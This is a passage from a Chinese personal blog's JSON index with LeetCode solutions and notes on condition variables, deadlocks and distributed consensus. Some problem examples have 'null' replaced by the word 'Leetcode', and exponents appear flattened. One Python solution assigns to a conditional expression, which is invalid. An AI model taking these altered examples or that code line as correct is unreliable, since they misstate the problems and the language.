也可以投報率不高，但一直吐小獎，這樣大部分的人都會用這台投報率其實不好的機器 ","permalink":"https://littlebees.github.io/2022/07/%E6%80%9D%E8%BE%A8%E8%B3%BD%E5%B1%80%E7%9C%8B%E7%A9%BF%E5%B1%80%E5%8B%A2%E5%89%B5%E9%80%A0%E5%84%AA%E5%8B%A2%E7%9A%84%E7%AD%96%E7%95%A5%E6%99%BA%E6%85%A7-%E5%BF%83%E5%BE%97/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e好看!!\n讓我之後想去看Algorithmic Game Theory\u003c/p\u003e","title":"思辨賽局：看穿局勢、創造優勢的策略智慧 心得"},{"content":"動機 應該可以改成iterator各自的BST，但很麻煩，就直接攤平吧\nProblem Given two binary search trees root1 and root2, return a list containing all the integers from both trees sorted in ascending order.\nExample 1:\nInput: root1 = [2,1,4], root2 = [1,0,3]Output: [0,1,1,2,3,4]Example 2:\nInput: root1 = [1,Leetcode,8], root2 = [8,1]Output: [1,1,8,8] Constraints:\nThe number of nodes in each tree is in the range [0, 5000].-105 \u003c= Node.val \u003c= 105 sol from heapq import merge class Solution: def getAllElements(self, root1: TreeNode, root2: TreeNode) -\u0026gt; List[int]: ret = [] def walk(r, acc): if r: tmp = walk(r.left, acc) tmp.append(r.val) return walk(r.right, tmp) else: return acc return list(merge(walk(root1,[]), walk(root2,[]))) ","permalink":"https://littlebees.github.io/2022/07/leetcode-1305-all-elements-in-two-binary-search-trees/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e應該可以改成iterator各自的BST，但很麻煩，就直接攤平吧\u003c/p\u003e","title":"leetcode-1305 - All Elements in Two Binary Search Trees"},{"content":"動機 dfs回傳最大的子節點\nProblem Given the root of a Binary Search Tree (BST), return the minimum absolute difference between the values of any two different nodes in the tree.\nExample 1:\nInput: root = [4,2,6,1,3]Output: 1Example 2:\nInput: root = [1,0,48,Leetcode,null,12,49]Output: 1 Constraints:\nThe number of nodes in the tree is in the range [2, 104].0 \u003c= Node.val \u003c= 105 Note: This question is the same as 783: https://leetcode.com/problems/minimum-distance-between-bst-nodes/\nsol class Solution: def getMinimumDifference(self, root: Optional[TreeNode]) -\u0026gt; int: ret = float(\u0026#39;inf\u0026#39;) def dfs(r,prev): nonlocal ret if not r: return prev else: a = dfs(r.left,prev) ret = min(ret, abs(r.val-prev), abs(r.val-a)) b = dfs(r.right,r.val) return b dfs(root,float(\u0026#39;inf\u0026#39;)) return ret ","permalink":"https://littlebees.github.io/2022/07/leetcode-530-minimum-absolute-difference-in-bst/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003edfs回傳最大的子節點\u003c/p\u003e","title":"leetcode-530 - Minimum Absolute Difference in BST"},{"content":"動機 post order traversal\nProblem Given the root of a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus the sum of all keys greater than the original key in BST.\nAs a reminder, a binary search tree is a tree that satisfies these constraints:\nThe left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees. Example 1:\nInput: root = [4,1,6,0,2,5,7,Leetcode,null,null,3,null,null,null,8]Output: [30,36,21,36,35,26,15,null,null,null,33,null,null,null,8]Example 2:\nInput: root = [0,null,1]Output: [1,null,1] Constraints:\nThe number of nodes in the tree is in the range [0, 104].-104 \u003c= Node.val \u003c= 104All the values in the tree are unique.root is guaranteed to be a valid binary search tree. Note: This question is the same as 1038: https://leetcode.com/problems/binary-search-tree-to-greater-sum-tree/\nsol class Solution: def convertBST(self, root: Optional[TreeNode]) -\u0026gt; Optional[TreeNode]: def post(root, cnt=0): if not root: return cnt else: right = post(root.right, cnt) root.val += right return post(root.left, root.val) post(root) return root ","permalink":"https://littlebees.github.io/2022/07/leetcode-538-convert-bst-to-greater-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003epost order traversal\u003c/p\u003e","title":"leetcode-538 - Convert BST to Greater Tree"},{"content":"動機 從bottom重建tree\n以後是不是應該整理dfs在tree上的用法?\nProblem Given the root of a binary tree and two integers val and depth, add a row of nodes with value val at the given depth depth.\nNote that the root node is at depth 1.\nThe adding rule is:\nGiven the integer depth, for each not Leetcode tree node cur at the depth depth - 1, create two tree nodes with value val as cur's left subtree root and right subtree root.cur's original left subtree should be the left subtree of the new left subtree root.cur's original right subtree should be the right subtree of the new right subtree root.If depth == 1 that means there is no depth depth - 1 at all, then create a tree node with value val as the new root of the whole original tree, and the original tree is the new root's left subtree. Example 1:\nInput: root = [4,2,6,3,1,5], val = 1, depth = 2Output: [4,1,1,2,null,null,6,3,1,5]Example 2:\nInput: root = [4,2,null,3,1], val = 1, depth = 3Output: [4,2,null,1,1,3,null,null,1] Constraints:\nThe number of nodes in the tree is in the range [1, 104].The depth of the tree is in the range [1, 104].-100 \u003c= Node.val \u003c= 100-105 \u003c= val \u003c= 1051 \u003c= depth \u003c= the depth of tree + 1 sol class Solution: def addOneRow(self, root: Optional[TreeNode], val: int, depth: int, left = True) -\u0026gt; Optional[TreeNode]: if depth == 0: return root elif depth == 1: ret = TreeNode(val) (ret.left if left else ret.right) = root return ret else: if not root: return root else: root.left = self.addOneRow(root.left, val, depth-1, True) root.right = self.addOneRow(root.right, val, depth-1, False) return root ","permalink":"https://littlebees.github.io/2022/07/leetcode-623-add-one-row-to-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e從bottom重建tree\u003c/p\u003e\n\u003cp\u003e以後是不是應該整理dfs在tree上的用法?\u003c/p\u003e","title":"leetcode-623 - Add One Row to Tree"},{"content":"動機 因為是BST情況就沒有那麼複雜\nProblem Serialization is converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.\nDesign an algorithm to serialize and deserialize a binary search tree. There is no restriction on how your serialization/deserialization algorithm should work. You need to ensure that a binary search tree can be serialized to a string, and this string can be deserialized to the original tree structure.\nThe encoded string should be as compact as possible.\nExample 1:\nInput: root = [2,1,3]Output: [2,1,3]Example 2:\nInput: root = []Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 104].0 \u003c= Node.val \u003c= 104The input tree is guaranteed to be a binary search tree. sol class Codec: def serialize(self, r: Optional[TreeNode]) -\u0026gt; str: if not r: return \u0026#39;\u0026#39; else: return f\u0026#39;{r.val} {self.serialize(r.left)} {self.serialize(r.right)}\u0026#39; def deserialize(self, data: str) -\u0026gt; Optional[TreeNode]: preorder = [int(x) for x in data.split(\u0026#34; \u0026#34;) if x] inorder = list(sorted(preorder)) def build(preo, ino): if not ino or not preo: return None else: ret = TreeNode(preo[0]) i = ino.index(preo[0]) ret.left = build(preo[1:1+i], ino[:i]) ret.right = build(preo[1+i:], ino[i+1:]) return ret return build(preorder,inorder) ","permalink":"https://littlebees.github.io/2022/07/leetcode-449-serialize-and-deserialize-bst/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e因為是BST情況就沒有那麼複雜\u003c/p\u003e","title":"leetcode-449 - Serialize and Deserialize BST"},{"content":"動機 猜數字\nProblem Given an array arr of positive integers sorted in a strictly increasing order, and an integer k.\nReturn the kth positive integer that is missing from this array.\nExample 1:\nInput: arr = [2,3,4,7,11], k = 5Output: 9Explanation: The missing positive integers are [1,5,6,8,9,10,12,13,...]. The 5th missing positive integer is 9.Example 2:\nInput: arr = [1,2,3,4], k = 2Output: 6Explanation: The missing positive integers are [5,6,7,...]. The 2nd missing positive integer is 6. Constraints:\n1 \u003c= arr.length \u003c= 10001 \u003c= arr[i] \u003c= 10001 \u003c= k \u003c= 1000arr[i] \u003c arr[j] for 1 \u003c= i \u003c j \u003c= arr.length Follow up:\nCould you solve this problem in less than O(n) complexity?\nsol class Solution: def findKthPositive(self, arr: List[int], k: int) -\u0026gt; int: a, b = 0, max(arr[-1], len(arr)+k) while a\u0026lt;b: mid = (a+b)//2 if mid-bisect_right(arr,mid) \u0026gt;= k: b = mid else: a = mid+1 return a ","permalink":"https://littlebees.github.io/2022/07/leetcode-1539-kth-missing-positive-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e猜數字\u003c/p\u003e","title":"leetcode-1539 - Kth Missing Positive Number"},{"content":"動機 直接求數字就好\nProblem Alice and Bob have a different total number of candies. You are given two integer arrays aliceSizes and bobSizes where aliceSizes[i] is the number of candies of the ith box of candy that Alice has and bobSizes[j] is the number of candies of the jth box of candy that Bob has.\nSince they are friends, they would like to exchange one candy box each so that after the exchange, they both have the same total amount of candy. The total amount of candy a person has is the sum of the number of candies in each box they have.\nReturn an integer array answer where answer[0] is the number of candies in the box that Alice must exchange, and answer[1] is the number of candies in the box that Bob must exchange. If there are multiple answers, you may return any one of them. It is guaranteed that at least one answer exists.\nExample 1:\nInput: aliceSizes = [1,1], bobSizes = [2,2]Output: [1,2]Example 2:\nInput: aliceSizes = [1,2], bobSizes = [2,3]Output: [1,2]Example 3:\nInput: aliceSizes = [2], bobSizes = [1,3]Output: [2,3] Constraints:\n1 \u003c= aliceSizes.length, bobSizes.length \u003c= 1041 \u003c= aliceSizes[i], bobSizes[j] \u003c= 105Alice and Bob have a different total number of candies.There will be at least one valid answer for the given input. sol class Solution: def fairCandySwap(self, aa: List[int], bs: List[int]) -\u0026gt; List[int]: tmp = (sum(bs)-sum(aa))//2 f = lambda x: x + tmp bs = set(bs) for a in aa: if f(a) in bs: return [a, f(a)] ","permalink":"https://littlebees.github.io/2022/07/leetcode-888-fair-candy-swap/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e直接求數字就好\u003c/p\u003e","title":"leetcode-888 - Fair Candy Swap"},{"content":"動機 猜數字\nProblem You are given an array nums of non-negative integers. nums is considered special if there exists a number x such that there are exactly x numbers in nums that are greater than or equal to x.\nNotice that x does not have to be an element in nums.\nReturn x if the array is special, otherwise, return -1. It can be proven that if nums is special, the value for x is unique.\nExample 1:\nInput: nums = [3,5]Output: 2Explanation: There are 2 values (3 and 5) that are greater than or equal to 2.Example 2:\nInput: nums = [0,0]Output: -1Explanation: No numbers fit the criteria for x.If x = 0, there should be 0 numbers \u003e= x, but there are 2.If x = 1, there should be 1 number \u003e= x, but there are 0.If x = 2, there should be 2 numbers \u003e= x, but there are 0.x cannot be greater since there are only 2 numbers in nums.Example 3:\nInput: nums = [0,4,3,0,4]Output: 3Explanation: There are 3 values that are greater than or equal to 3. Constraints:\n1 \u003c= nums.length \u003c= 1000 \u003c= nums[i] \u003c= 1000 sol class Solution: def specialArray(self, nums: List[int]) -\u0026gt; int: a,b = 0, len(nums) nums.sort() while a\u0026lt;b: mid = (a+b)//2 tmp = len(nums)-bisect_left(nums, mid) if len(nums)-bisect_left(nums, mid) \u0026gt; mid: a = mid+1 else: b = mid return a if len(nums)-bisect_left(nums, a) == a else -1 ","permalink":"https://littlebees.github.io/2022/07/leetcode-1608-special-array-with-x-elements-greater-than-or-equal-x/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e猜數字\u003c/p\u003e","title":"leetcode-1608 - Special Array With X Elements Greater Than or Equal X"},{"content":"動機 從一個cond var的bug開始 之前有一個程式是會開兩個thread之後其中一條會卡死，所以利用cond var通知main thread去kill另一條\nauto f = []() { // something... cond_notify(); }; lk.lock() create_thread() create_thread() cond_wait(\u0026amp;lk) 之後就有lost wakeup signal，其實很簡單，因為thread結束的時間可能比到達wait還快 解法就是把lock上回去，利用lock確保，notify一定會被看到\nauto f = []() { // something... lk.lock(); cond_notify(); lk.unlock(); }; lk.lock() create_thread() create_thread() cond_wait(\u0026amp;lk) 虛假喚醒 上面看起來是ok了，但是cond其實可能在任何時刻喚醒，所以有可以能喚醒了但是thread根本沒做事 所以要加條件\nauto f = []() { // something... lk.lock(); flag = true; cond_notify(); lk.unlock(); }; lk.lock() create_thread() create_thread() while (!flag) cond_wait(\u0026amp;lk) xv6的sleep xv6的wakeup需要吃一個鎖，裡面的理由與上面的一樣，為了看到對的資料(atomic)\n下面是xv6中的sleep lock，這裡有個問題在s-\u0026gt;count == 0為true時還沒到sleep時如果有人做wakeup就會lost wakeupsignal\nvoid V(struct semaphore *s) { acquire(\u0026amp;s-\u0026gt;lock); s-\u0026gt;count += 1; wakeup(s); release(\u0026amp;s-\u0026gt;lock); } void P(struct semaphore *s) { while(s-\u0026gt;count == 0) sleep(s); acquire(\u0026amp;s-\u0026gt;lock); s-\u0026gt;count -= 1; release(\u0026amp;s-\u0026gt;lock); } 但這裡不能直接把P的lock往前拉，這樣就直接deadlock P做了sleep之後想要V就會出事\nvoid V(struct semaphore *s) { acquire(\u0026amp;s-\u0026gt;lock); s-\u0026gt;count += 1; wakeup(s); release(\u0026amp;s-\u0026gt;lock); } void P(struct semaphore *s) { acquire(\u0026amp;s-\u0026gt;lock); while(s-\u0026gt;count == 0) sleep(s); s-\u0026gt;count -= 1; release(\u0026amp;s-\u0026gt;lock); } 所以在sleep的同時必須同時解鎖 這個與pthread的cond var一樣，同時也是分布式鎖要注意的地方，上鎖與設定timeout要同時\nvoid V(struct semaphore *s) { acquire(\u0026amp;s-\u0026gt;lock); s-\u0026gt;count += 1; wakeup(s); release(\u0026amp;s-\u0026gt;lock); } void P(struct semaphore *s) { acquire(\u0026amp;s-\u0026gt;lock); while(s-\u0026gt;count == 0) sleep(s, \u0026amp;s-\u0026gt;lock); s-\u0026gt;count -= 1; release(\u0026amp;s-\u0026gt;lock); } 如果不是同一個鎖? 4-way deadlock 之前寫raft遇到的，直接借助教的code\nfunc (a *App) RPC(args interface{}, reply interface{}) { // ... a.mutex.Lock() i := a.raft.Start(args) // update some data structure so that apply knows to poke us later a.mutex.Unlock() // wait for apply to poke us return } func (r *Raft) Start(cmd interface{}) int { r.mutex.Lock() // do things to start agreement on this new command // store index in the log where cmd was placed r.mutex.Unlock() return index } func (a *App) apply(index int, cmd interface{}) { a.mutex.Lock() switch cmd := cmd.(type) { case GetArgs: // do the get // see who was listening for this index // poke them all with the result of the operation // ... } a.mutex.Unlock() } func (r *Raft) AppendEntries(...) { // ... r.mutex.Lock() // ... for r.lastApplied \u0026lt; r.commitIndex { r.lastApplied++ r.app.apply(r.lastApplied, r.log[r.lastApplied]) } // ... r.mutex.Unlock() } 在AppendEntries中，想做apply APP透過RPC做Start 這樣就deadlock\nAppendEntries拿著raft的鎖，想要app的鎖 RPC拿著app的鎖，想要raft的鎖(Start) 我之前的raft是直接透過channel做apply，但是tester的channel是unbuffered!! 所以滿了會block\ntester想start，raft想塞，就deadlock 最後直接多一個buffered channel放要commit的訊息，讓另一個thread去commit\n","permalink":"https://littlebees.github.io/2022/04/%E6%A2%9D%E4%BB%B6%E8%AE%8A%E6%95%B8%E8%88%87%E5%8E%9F%E5%AD%90%E6%80%A7/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"條件變數與原子性"},{"content":"動機 讓每個點決定自己該做什麼\nProblem Given the root of a binary tree, return the sum of values of nodes with an even-valued grandparent. If there are no nodes with an even-valued grandparent, return 0.\nA grandparent of a node is the parent of its parent if it exists.\nExample 1:\nInput: root = [6,7,8,2,7,1,3,9,Leetcode,1,4,null,null,null,5]Output: 18Explanation: The red nodes are the nodes with even-value grandparent while the blue nodes are the even-value grandparents.Example 2:\nInput: root = [1]Output: 0 Constraints:\nThe number of nodes in the tree is in the range [1, 104].1 \u003c= Node.val \u003c= 100 Sol 讓每個點決定自己該做什麼 所以把parent的資料傳下去\nclass Solution { public: int sumEvenGrandparent(TreeNode* root, bool p=0, bool gp=0) { if (!root) { return 0; } else { int ret = gp ? root-\u0026gt;val : 0; bool even = (root-\u0026gt;val % 2 == 0); int left = sumEvenGrandparent(root-\u0026gt;left, even, p); int right = sumEvenGrandparent(root-\u0026gt;right, even, p); return ret + left + right; } } }; ","permalink":"https://littlebees.github.io/2022/04/leetcode-1315-sum-of-nodes-with-even-valued-grandparent/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e讓每個點決定自己該做什麼\u003c/p\u003e","title":"leetcode-1315 - Sum of Nodes with Even-Valued Grandparent"},{"content":"動機 要複習怎麼用C++做leetcode\n龜兔賽跑 一個快(2倍速)，一個慢(1倍速) 同樣都走k次 因為最後在loop遇到，所以兩者的距離只差在common的那一段 所以做最後只要再走一次就是起點\nslow = common + x + (cycle*a) fast = common*2 + x + 2*(cycle*a) // 因為最後在loop遇到，所以x會是一樣 (我忘了實際的proof...) fast = slow*2 fast-slow = common 142. Linked List Cycle II class Solution { public: ListNode *detectCycle(ListNode *head) { if (head \u0026amp;\u0026amp; head-\u0026gt;next) { ListNode *a=head-\u0026gt;next,*b=head-\u0026gt;next-\u0026gt;next; for(;a!=b \u0026amp;\u0026amp; b \u0026amp;\u0026amp; b-\u0026gt;next;a=a-\u0026gt;next, b=b-\u0026gt;next-\u0026gt;next) ; if (b \u0026amp;\u0026amp; b-\u0026gt;next \u0026amp;\u0026amp; a == b) { a = head; for(;a!=b;a=a-\u0026gt;next, b=b-\u0026gt;next) ; return a; } } return 0; } }; 287. Find the Duplicate Number 這題的資料很特別，都是1~n，同時array長n+1 這代表array資料一定在array的index中，所以有重複就是cycle\nclass Solution { public: int findDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int a = nums[nums[0]], b = nums[nums[nums[0]]]; for (;a!=b;a=nums[a], b=nums[nums[b]]) ; for (a = nums[0];a!=b;a=nums[a], b=nums[b]) ; return a; } }; 160. Intersection of Two Linked Lists 龜兔賽跑能找到起點是因為兩者只差一段common的距離\n所以只要把兩個ptr走的距離湊成一樣的就可以找到起點\n當走到底就從另一個開始走\na = a_diff + common b = b_diff + common 走到底之後 a =\u0026gt; a_diff + common + b_diff b =\u0026gt; b_diff + common + a_diff class Solution { public: ListNode *getIntersectionNode(ListNode *a, ListNode *b) { if (!a || !b) return 0; ListNode *x = a, *y = b; while (x != y) { x = !x ? b : x-\u0026gt;next; y = !y ? a : y-\u0026gt;next; } return x; } }; matrix翻翻樂 常常見到，不知道為什麼\n48. Rotate Image 有兩個解法\n一個是4個一起換\n一個是對角線 (固定走橫的，想像成轉成直線) (i, j), (n-1-i, n-1-j) 另一個反對角線 (固定走直的，想像成轉成橫線) (n-1-j,i), (j,n-1-i) 之後把覆蓋順序寫下來 (i, j) \u0026lt;- (n-1-j, i) \u0026lt;- (n-1-i, n-1-j) \u0026lt;- (j, n-1-i)\nclass Solution { public: void rotate(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; mx) { auto m = mx.size(); auto inv = [m](int x) { return m-1-x; }; // (i, j) \u0026lt;- (n-1-j, i) \u0026lt;- (n-1-i, n-1-j) \u0026lt;- (j, n-1-i) for (int i=0;i\u0026lt;(m\u0026gt;\u0026gt;1);i++) for (int j=0;j\u0026lt;(m-(m\u0026gt;\u0026gt;1));j++) { int tmp = mx[i][j]; mx[i][j] = mx[inv(j)][i]; mx[inv(j)][i] = mx[inv(i)][inv(j)]; mx[inv(i)][inv(j)] = mx[j][inv(i)]; mx[j][inv(i)] = tmp; } } }; 另一個是transpose(對角線互換)後把column都reverse\nclass Solution { public: void rotate(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; mx) { for(int i=0;i\u0026lt;mx.size();i++) { for(int j=i+1;j\u0026lt;mx.size();j++) { swap(mx[i][j],mx[j][i]); } reverse(mx[i].begin(),mx[i].end()); } } }; 54. Spiral Matrix 用index是最麻煩的，這裡可以拿第一排之後逆時針轉90度\nclass Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; back90(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; m) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; ret; for (int j=m[0].size()-1;j\u0026gt;=0;j--) { vector\u0026lt;int\u0026gt; row; for (int i=0;i\u0026lt;m.size();i++) row.push_back(m[i][j]); ret.push_back(row); } return ret; } vector\u0026lt;int\u0026gt; spiralOrder(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; m) { vector\u0026lt;int\u0026gt; ret; while (!m.empty()) { std::copy(m[0].begin(),m[0].end(), std::back_inserter(ret)); m.erase(m.begin()); m = back90(m); } return ret; } }; binary search 做出單調函數，來猜數字 丟左邊，留右邊 終點(b)透過答案存不存在決定要不要-1 287. Find the Duplicate Number 因為數字是累積的，只會越來越多(單調) 所以可以設計一個函數把array轉成單調的array做bsearch\n只要能湊出單調就能用bsearch\n要找什麼? 找總量不對的第一個位置\nb帶nums.size()-1，因為最後出來的最大數字就是這個值 需要捨棄的部分帶a = mid+1 要保留的部分帶b = mid return就是a\nclass Solution { public: int findDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums) { auto small_or_equal = [\u0026amp;](int cur) { int count = 0; for (auto \u0026amp;num: nums) { if (num \u0026lt;= cur) count++; } return count; }; int a = 0, b = nums.size()-1; while (a \u0026lt; b) { int mid = (a+b)/2; if (small_or_equal(mid) \u0026gt; mid) b = mid; else a = mid+1; } return a; } }; 33. Search in Rotated Sorted Array 第一段找最小 因為是rotate，所以最大一定在中間 總方向就是丟左邊\n所以我們取中點看右邊\n剩下就是用這個index做map之後做bsearch\n注意到這裡的b是帶nums.size()，因為有可能不存在\nclass Solution { public: int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { int a=0,b=nums.size()-1; // 這裡要-1 while (a\u0026lt;b) { int mid = (a+b)/2; if (nums[mid]\u0026gt;nums[b]) a = mid+1; else b = mid; } int base = a; for(a=0,b=nums.size();a\u0026lt;b;) { // 這裡不能-1 int mid = (a+b)/2; int i = (mid+base) % nums.size(); if (nums[i] == target) return i; else if (nums[i] \u0026lt; target) a = mid+1; else b = mid; } return -1; } }; 162. Find Peak Element 確定是上升就可以 丟左邊，留右邊\nclass Solution { public: int findPeakElement(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int a = 0, b = nums.size()-1; while (a \u0026lt; b) { int mid = (a+b)/2; if (nums[mid] \u0026lt; nums[mid+1]) a = mid+1; else b = mid; } return a; } }; 34. Find First and Last Position of Element in Sorted Array 其實就是找lowerbound與upperbound-1\n注意到\nlowerbound與upperbound只差在一個等號 upperbound的b還是帶nums.size()，因為可能不存在 class Solution { public: vector\u0026lt;int\u0026gt; searchRange(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { vector\u0026lt;int\u0026gt; ret; int a = 0, b = nums.size(); while (a \u0026lt; b) { int mid = (a+b)/2; if (nums[mid] \u0026lt; target) a = mid+1; else b = mid; } if (a == nums.size() || nums[a] != target) return {-1, -1}; ret.push_back(a); b = nums.size(); while (a \u0026lt; b) { int mid = (a+b)/2; if (nums[mid] \u0026lt;= target) a = mid+1; else b = mid; } ret.push_back(a-1); return ret; } }; 154. Find Minimum in Rotated Sorted Array II Find Peak Element重複的話?\n重複就縮上界，因為不知道怎麼bsearch\nclass Solution { public: int findMin(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int a=0,b=nums.size()-1; // 這裡要-1 while (a\u0026lt;b) { int mid = (a+b)/2; if (nums[mid]\u0026gt;nums[b]) a = mid+1; else if (nums[mid] \u0026lt; nums[b]) b = mid; else b--; } return nums[a]; } }; topo sort 我真的忘了\n建圖 做topo sort dfs dfs紀錄node狀態 沒走過、走過、正在走 遇到正在走要報錯 最後要記得reverse結果 bfs 要算in_degree(有多少點指到) 把degree 0塞到queue 處理完把別人的ingree去掉 除非要求，不然用bfs比較好，因為cycle只要看bfs結束時in_degree的表還有沒有東西就好 dfs要另外處理cycle還要管理中間走過的點，如果是python就算了，用c++真的很痛苦，同時還要reverse結果\u0026hellip;\nmono stack 根據關注點不同有不同的看法 排序，留下最後的字典序 (stk是重點) 1 3 7 2 1 2 可以看成2把3,7吃了，只留下該範圍最小的，這也是字典序的由來 內容物: 節點 區塊 夾出區間，中間是最大或是最小 (被pop的資料是重點) while stk and stk[-1] \u0026lt;= n 7 3 2 ..left.. 1 ..right.. 2 right的所有數字都會小於1 left的所有數字都會等於1 1是這個區間(去頭尾)最大的，含頭尾的區間中的最小的 while stk and stk[-1] \u0026gt;= n 1 2 3 ..left.. 7 ..right.. 2 right的所有數字都會大於7 left的所有數字都會等於7 7是這個區間最小的，含頭尾的區間中的最大的 這樣就可以用stk[-2]與n，做出一個閉區間 記得處理沒有stk的case \u0026lt;=與\u0026gt;=怎麼用? 看資料是遞增(\u0026gt;=)還是遞減(\u0026lt;=) 箭頭指向最低的地方 在需要保持原本的順序、字典序、前面的資料會被後面的蓋掉時就可以老慮用用看 84. Largest Rectangle in Histogram class Solution { public: int largestRectangleArea(vector\u0026lt;int\u0026gt;\u0026amp; hs) { vector\u0026lt;int\u0026gt; stk; int ret = 0; hs.push_back(0); // 留一個最低的把stack都壓出來 for (int i=0;i\u0026lt;hs.size();i++) { while (!stk.empty() \u0026amp;\u0026amp; hs[stk.back()] \u0026gt;= hs[i]) { // not \u0026lt;= if (stk.size() \u0026gt; 1) ret = max(ret, hs[stk.back()]*(i-stk[stk.size()-2]-1)); // not +1 else ret = max(ret, hs[stk.back()]*i); stk.pop_back(); } stk.push_back(i); } return ret; } }; sliding windows 用閉區間做\n列舉起點\nb = 0 win = [] for a in range(len(fs)): while b \u0026lt; len(fs) and when_win_is_legal(): update_ret() expand_win() shrink_win() return ret 列舉終點\na = 0 win = [] for b in range(len(fs)): update_win() while a \u0026lt;= b and when_win_is_illegal(): shrink_win() update_ret() return ret atMost\ndef atmost(bound): ret = i = 0 for j,n in enumerate(nums): update_win() while i \u0026lt;= j and when_win_is_illegal(): shrink_win() ret += j-i+1 return ret prefix sum 算區間和 和 從a~b的總和 如果有負數，可以代表偏離原點多遠 一般來說，通常第一個會是0代表沒有加任何東西的狀態 所以index從1開始，代表從arr[0]~arr[i-1] static (index -\u0026gt; sum) list(accumulate(nums, initial=0)) LC209 因為arr只有正數 可以用sliding window，去收縮大小 可以用prefix sum，在prefix sum做binary search 我們會先列舉起點到終點 所以prefix sum也是從起點去往後找終點 TODO: LC209與LC525為什麼一個是從後面一個從前面 in fly (sum -\u0026gt; count or [index]) LC560 基本款 LC525 與LC209不同這裡是每加一個都會產生變化 所以可以用in fly一邊建prefix sum，再找有沒有符合的 注意同一個sum我們只要最前面的 ","permalink":"https://littlebees.github.io/2022/04/review-leetcode/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要複習怎麼用C++做leetcode\u003c/p\u003e","title":"review-leetcode"},{"content":"動機 整理常見分散式設計手法\n原子性 每一步都是一次到位或是根本沒有做\n對時間建模 條件:\n時間嚴格遞增\n同一個時間下，所有人見到的時間一致\nlamport clock\nclk++ max(其他人的clk, 自己的clk)+1 vector clock\n紀錄每個人的clk 法定人數 (quorum) 只有在同樣的動作到法定人數的承認才做 (多數決)\n這樣可以確保至少每一次的動作至少有一個人是知道前一次操作的\n法定人數 + 對時間建模 = read quorum user拿到許多response，要怎麼確認是最新的? 就是留下時間，這裡通常叫version，但其實就是lamport clock\nanti-entropy (recovery) user拿到最新的結果，可以write回去\n提到anti-entropy，可以講到Dynamo\nDynamo是只有法定人數去調整一致性 在衝突處理是用vector-clock之後配合user自己選\n在做recovery是用Merkle tree去比對不同node之間的key是不是不同 Merkle tree就是一顆一直hash組成tree node的tree Merkle tree的好處是不用拿所有hash過的資料就可以找出是不是與tree持有的hash不同\n像下面的就是只要有root，hash(AB)，hash(C)，資料D，就能確認資料D的版本對不對 write quorum的問題 但如果同時有人拿同一個lamport clock去寫? 所以需要quorum給承諾，這個lamport clock只有我可以用，同時你不能吃\u0026lt;=這個clock的資料 而這個就是2 phase commit\n2 phase commit (2PC) prepare 問大家都ok嗎? 回ok client在回ok前要保證 當下的state是ok的 不論如何，都不會忘記當下的狀態 之後就是等 回abort 就讓所有人abort commit 讓大家commit 3 phase commit (3PC) 2PC有個問題是如果回ok之後就是等，但\n如果問的人掛了 有人就是不回 其他人就是等到死\n所以3PC加入pre-prepare\npre-prepare 問大家都ok嗎? 回ok client在回ok前要保證 當下的state是ok的 不論如何，都不會忘記當下的狀態 之後就是等 回abort 就讓所有人abort prepare 問大家都ok嗎? 回ok 自己出事不回 commit 讓大家commit 因為有了pre-prepare的保證，所以其他人可以在回了commit之後等\n問的人 timeout 其中一個觸發來完成commit\n租約 每個node想確認其他node有沒有出事的其中一種手段，其實就是timeout\n例子 分散式鎖 原子性 對時間建模 redlock: wall time zookeeper: file exist (or filename上有id) chubby: lock id paxos 法定人數 對時間建模 2 phase commit raft、zab paxos 租約 (確認leader還活著) 題外話 分散式事務 (事務的法定人數就是所有人，事務的時間就是commit或abort) 2 phase commit ","permalink":"https://littlebees.github.io/2022/04/%E5%88%86%E6%95%A3%E5%BC%8F%E6%89%8B%E6%B3%95/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理常見分散式設計手法\u003c/p\u003e","title":"分散式手法"},{"content":"動機 分散式系統最重要的就是在不同的錯誤情境下達成共識 之後追求performance\n串起這一切的就是時間與與之對應的排序\n下面就來簡單的整理一下\n錯誤 傳訊時可能遺失、out-of-order、重複 接收方可能當機導致不能回 (但recover會知道自己之前做了什麼)\n在上面的情況下，分成兩種錯誤\n拜占庭 在同一個情況(狀態)，出來的output可能不同 (可能是sender在搞，也有可能是在中間被改，換言之 資料損壞) 拜占庭中的叛徒 leader可以對不同人送不同的msg 不能直接用leader的msg，要參考其他人的 非拜占庭 